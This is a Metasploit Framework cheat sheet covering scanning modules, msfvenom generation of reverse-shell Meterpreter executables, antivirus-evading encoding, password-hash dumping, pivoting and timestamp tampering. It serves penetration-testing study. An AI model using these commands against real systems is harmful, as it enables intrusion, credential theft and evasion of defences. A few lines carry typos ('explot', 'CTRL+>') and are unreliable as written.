# Metasploit Cheat Sheet

A practical quick-reference for common Metasploit Framework usage, including auxiliary modules, payload generation, Meterpreter commands, and session management.

---
# Metasploit Overview
## Metasploit Framework
A platform for developing and executing security tools and exploits.

## Meterpreter
A payload that provides interactive control over a compromised system, running as a DLL loaded into a target process.

## msfvenom
The `msfvenom` tool is used to generate **Metasploit** payloads (such as *Meterpreter*) as standalone files and optionally encode them.\
It replaces the older `msfpayload` and `msfencode` tools.

---


## Useful Auxiliary Modules

### Port Scanner
```bash
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 10.10.10.0/24
msf > run
```
## DNS Enumeration
```bash
msf > use auxiliary/gather/dns_enum
msf > set DOMAIN target.tgt
msf > run
```
## FTP Server
```bash
msf > use auxiliary/server/ftp
msf > set FTPROOT /tmp/ftproot
msf > run
```
## Proxy Server (SOCKS4)
```bash
msf > use auxiliary/server/socks4
msf > run
```
Any provided traffic that matches the subnet of a route will be routed through the session specified by `route`.\
User `proxychains` configured for `socks4` to route application traffic through a **Meterpreter** session.

---

## msfvenom

**List available payloads:**
```bash
msfvenom -l payloads
```
### Basic usage
```bash
msfvenom -p [PayloadPath] -f [FormatType] \
LHOST=[LocalHost] LPORT=[LocalPort]
```
### Example: Reverse Meterpreter Executable
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
-f exe LHOST=10.1.1.1 LPORT=4444 > met.exe
```
### Output Format Options
- `exe` - Windows Executable
- `pl` - Perl
- `rb`- Ruby
- `raw` - Raw shellcode
- `c` - C source code
**List formats:**
```bash
msfvenom --help-formats
```
---
## Encoding Payloads with msfvenom
Payloads can be encoded to help evade antivirus detection.

**List encoders:**
```bash
msfvenom -l encoders
```
### Encoding Syntax
```bash
msfvenom -p [Payload] -e [Encoder] -i [Iterations] \
-f [FormatType] LHOST=[LocalHost] LPORT=[LocalPort]
```
### Example: Encode Payload 5 Times
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
-i 5 -e x86/shikata_ga_nai -f exe \
LHOST=10.1.1.1 LPORT=4444 > mal.exe
```
---

## Meterpreter Post Modules
Post-exploitation modules that run against an active Meterpreter session.

**From Meterpreter**
```bash
meterpreter > run post/multi/gather/env
```
**From msfconsole**
```bash
msf > use post/windows/gather/hashdump
msf > show options
msf > set SESSION 1
msf > run
```
---

## Managing Sessions

### Exploitation Modes
Run exploit and immediately background the session:
```bash
msf > exploit -z
```
Run exploit in background as a job:
```bash
msf > exploit -j
```

### Jobs
List jobs:
```bash
msf > jobs -l
```
Kill a job:
```bash
msf > jobs -k [jobID]
```

### Sessions
List sessions:
```bash
msf > sessions -l
```
Interact with a session:
```bash
msf > sessions -i [SessionID]
```
Background an active session:
```bash
meterpreter > background
```
or press `CTRL+>`

---
## Routing Through Sessions (Pivoting)
Route traffic through a compromised host:
```bash
msf > route add [Subnet] [Netmask] [SessionID]
```
All modules targeting the routed subnet will pivot through the specified session.

---
## Metasploit Console Basics (msfconsole)
Search for a module:
```bash
msf > search [regex]
```
use a module:
```bash
msf > use explot/[ExploitPath]
```
Set payload:
```bash
msf > set PAYLOAD [PayloadPath]
```
Show module options:
```bash
msf > show options
```
Set option value:
```bash
msf > set [Option] [Value]
```
Run exploit:
```bash
msf > exploit
```
---

# Command List (Meterpreter)
## Base Commands
- `help`/`?` - Show help
- `exit`/`quit` - Exit session
- `sysinfo` - System and OS info
- `shutdown`/`reboot` - Power Controls
## Process Commands
- `getpid` - Current Process ID
- `getuid` - Current user
- `ps` - Process list
- `kill [PID]` - Kill process
- `execute` - Run a program
- `migrate [PID]` - Migrate to another process
## Network Commands
- `ipconfig` - Network interfaces
- `portfwd` - Port forwarding
- `route` - View/Manage routing table
## File System Commands
- `cd` - Change directory
- `lcd` - Change local directory
- `pwd`/`getpwd` - Current directory
- `ls` - List files
- `cat` - View content
- `download`/`upload` - Transfer files
- `mkdir`/`rmdir` - Create/Remove directories
- `edit` - Edit file (default editor)
## Miscellaneous
- `idletime` - User idle time
- `uictl enable | disable keyboard | mouse`
- `screenshot` - Capture screen
---
## Additional Modules
```bash
use priv
hashdump
timestomp
```


